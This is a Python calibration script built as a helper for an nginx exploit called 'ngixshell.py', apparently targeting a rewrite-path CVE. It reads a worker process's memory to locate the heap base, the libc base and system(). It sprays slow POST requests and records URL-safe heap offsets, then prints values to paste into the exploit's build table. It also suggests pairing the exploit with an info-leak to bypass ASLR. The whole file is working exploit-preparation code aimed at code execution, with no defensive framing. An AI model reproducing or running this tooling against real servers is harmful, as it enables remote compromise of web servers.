#!/usr/bin/env python3
"""
calibrate.py — compute HEAP_BASE and PREREAD_HEAP_OFFSETS for any nginx worker.

Requirements
------------
* Local root access to /proc/<worker_pid>/mem (run as root on the target host)
* ASLR disabled: echo 0 > /proc/sys/kernel/randomize_va_space
* nginx configured with a proxy_pass location (for body buffering) and a
  rewrite location (CVE trigger path)

Usage
-----
  python3 calibrate.py <host> <port> <worker_pid>

Output
------
Prints the HEAP_BASE, LIBC_BASE, system() offset, and PREREAD_HEAP_OFFSETS
in a format ready to paste into ngixshell.py's KNOWN_BUILDS dictionary.

Example
-------
  python3 calibrate.py 127.0.0.1 19321 12345
"""

import socket, struct, time, sys, os, re, subprocess

# ─── NGX_ESCAPE_ARGS safe-byte filter ─────────────────────────────────────────
_T = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
SAFE = set(b for b in range(256) if not (_T[b >> 5] & (1 << (b & 0x1f))))


def is_safe(addr: int) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def read_heap_ranges(pid: int):
    ranges = []
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            if "[heap]" in line:
                s, e = line.split()[0].split("-")
                ranges.append((int(s, 16), int(e, 16)))
    return ranges


def heap_snapshot(pid: int) -> dict:
    snap = {}
    for start, end in read_heap_ranges(pid):
        with open(f"/proc/{pid}/mem", "rb") as mem:
            mem.seek(start)
            snap[start] = mem.read(end - start)
    return snap


def diff_snapshots(before: dict, after: dict) -> list:
    diffs = []
    for base, new in after.items():
        old = before.get(base, b"")
        size = min(len(old), len(new))
        for i in range(0, size - 16, 8):
            if old[i:i+16] == b"\x00"*16 and any(b != 0 for b in new[i:i+16]):
                diffs.append(base + i)
    return diffs


def open_slow_post(host: str, port: int, body_len: int = 4096,
                   proxy_path: str = "/upload") -> socket.socket:
    """Open a POST that claims 4× the body length to keep nginx waiting."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    body = b"X" * body_len
    s.sendall(
        b"POST " + proxy_path.encode() + b" HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(body_len * 4).encode() + b"\r\n"
        b"Connection: keep-alive\r\n"
        b"\r\n" + body
    )
    return s


def find_system(pid: int):
    """Return (libc_base, system_offset) from /proc/pid/maps + readelf."""
    with open(f"/proc/{pid}/maps") as f:
        for line in f:
            parts = line.split()
            if len(parts) < 6: continue
            path = parts[5]
            if ("libc" in path or "musl" in path) and "r-xp" in parts[1]:
                libc_base = int(parts[0].split("-")[0], 16)
                libc_file = f"/proc/{pid}/root{path}" if os.path.exists(f"/proc/{pid}/root{path}") else path
                try:
                    out = subprocess.check_output(
                        ["readelf", "-s", libc_file], stderr=subprocess.DEVNULL
                    ).decode()
                    for l in out.splitlines():
                        if " system" in l and ("FUNC" in l or "func" in l):
                            m = re.search(r"^\s+\d+:\s+([0-9a-f]+)\s", l)
                            if m:
                                raw_offset = int(m.group(1), 16)
                                # readelf shows offset from file start; subtract
                                # the file offset of this segment to get VA offset
                                file_off = int(parts[2], 16)
                                sys_va_off = raw_offset  # for position-relative libs
                                return libc_base - file_off, raw_offset
                except Exception:
                    pass
    return None, None


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    PID  = int(sys.argv[3])

    heap_ranges = read_heap_ranges(PID)
    if not heap_ranges:
        print(f"[!] Cannot read /proc/{PID}/maps — run as root?")
        sys.exit(1)

    HEAP_BASE = heap_ranges[0][0]
    print(f"[*] Worker PID : {PID}")
    print(f"[*] HEAP_BASE  : 0x{HEAP_BASE:x}")

    libc_base, sys_off = find_system(PID)
    if libc_base:
        print(f"[*] LIBC_BASE  : 0x{libc_base:x}")
        print(f"[*] sys_offset : 0x{sys_off:x}")
        print(f"[*] SYSTEM_ADDR: 0x{libc_base + sys_off:x}")
    else:
        print("[!] Could not locate system() — check libc path")

    print()
    print("[*] Opening spray connections and tracking heap allocations ...")

    safe_offsets = []
    conns = []

    for n in range(30):
        before = heap_snapshot(PID)
        c = open_slow_post(HOST, PORT)
        time.sleep(0.1)
        after = heap_snapshot(PID)
        conns.append(c)

        new_addrs = diff_snapshots(before, after)
        for addr in new_addrs:
            off = addr - HEAP_BASE
            if 0 < off < 0x300000:
                safe = is_safe(addr)
                print(f"  conn {n+1:2d}: heap+0x{off:06x} (0x{addr:012x}) "
                      f"{'URL-SAFE' if safe else 'unsafe'}")
                if safe and off not in safe_offsets:
                    safe_offsets.append(off)

    for c in conns:
        try: c.close()
        except: pass

    print()
    print("=" * 60)
    print("  CALIBRATION RESULT")
    print("=" * 60)
    print(f"  HEAP_BASE  = 0x{HEAP_BASE:x}")
    if libc_base:
        print(f"  LIBC_BASE  = 0x{libc_base:x}")
        print(f"  sys_offset = 0x{sys_off:x}")
    print()
    print("  Paste into KNOWN_BUILDS in ngixshell.py:")
    print()
    print('    "nginx/VERSION-variant": {')
    print(f'        "heap_base":  0x{HEAP_BASE:x},')
    if libc_base:
        print(f'        "libc_base":  0x{libc_base:x},')
        print(f'        "sys_offset": 0x{sys_off:x},')
    print(f'        "offsets": {sorted(set(safe_offsets))},')
    print('    },')

    if not safe_offsets:
        print()
        print("  [!] No URL-safe offsets found.")
        print("      This HEAP_BASE produces no safe candidate addresses.")
        print("      The exploit cannot directly target this nginx binary.")
        print("      Possible solutions:")
        print("        • Find a different nginx build with a lower HEAP_BASE")
        print("        • Use --heap-base to try a different base address")
        print("        • Pair with an info-leak vulnerability for ASLR bypass")


if __name__ == "__main__":
    main()
